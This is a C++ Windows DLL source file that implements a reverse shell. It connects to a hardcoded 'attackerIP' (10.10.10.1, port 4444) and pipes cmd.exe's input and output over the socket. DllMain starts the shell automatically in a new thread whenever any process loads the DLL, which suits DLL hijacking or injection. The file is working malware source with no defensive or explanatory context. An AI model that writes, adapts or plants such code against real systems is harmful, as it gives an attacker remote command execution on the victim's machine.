#include "pch.h"
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

// Function prototype
DWORD WINAPI RunMeThread(LPVOID lpParam);

extern "C" {
    __declspec(dllexport) BOOL WINAPI runMe(void) {
        WSADATA socketData;
        SOCKET sock = INVALID_SOCKET;
        struct sockaddr_in addr;
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        const char* attackerIP = "10.10.10.1";
        short attackerPort = 4444;
        wchar_t cmd[] = L"cmd.exe";

        // Initialize socket library
        if (WSAStartup(MAKEWORD(2, 2), &socketData) != 0) {
            return FALSE;
        }

        // Create socket object
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            return FALSE;
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(attackerPort);
        InetPtonA(AF_INET, attackerIP, &addr.sin_addr);

        // Establish connection to the remote host
        if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            return FALSE;
        }

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        ZeroMemory(&pi, sizeof(pi));

        // Initiate cmd.exe with redirected streams
        if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            closesocket(sock);
            WSACleanup();
            return FALSE;
        }

        // Wait for the process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Cleanup
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);
        WSACleanup();

        return TRUE;
    }
}

// Thread function that calls runMe
DWORD WINAPI RunMeThread(LPVOID lpParam) {
    runMe();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  nReason, LPVOID lpReserved) {
    HANDLE hThread = NULL;
    
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        hThread = CreateThread(NULL, 0, RunMeThread, NULL, 0, NULL);
        if (hThread != NULL) {
            CloseHandle(hThread);
        }
        break;
        
    case DLL_PROCESS_DETACH:
        break;
        
    case DLL_THREAD_ATTACH:
        break;
        
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
